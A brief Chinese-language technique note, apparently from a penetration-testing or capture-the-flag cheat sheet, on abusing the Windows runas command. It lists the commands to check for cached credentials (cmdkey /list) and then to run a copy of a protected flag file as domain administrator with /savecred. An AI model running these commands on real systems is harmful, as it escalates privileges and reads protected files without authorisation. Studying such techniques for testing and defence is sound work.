# runas

## 介绍

runas是windows cmd命令，作为某个身份运行程序。

## 利用

### 1）查看是否拥有本地缓存凭据

cmdkey /list

### 2）拥有缓存凭据后

runas /user:domain\administrator /savecred "cmd /c COPY root.txt c://temp/1.txt"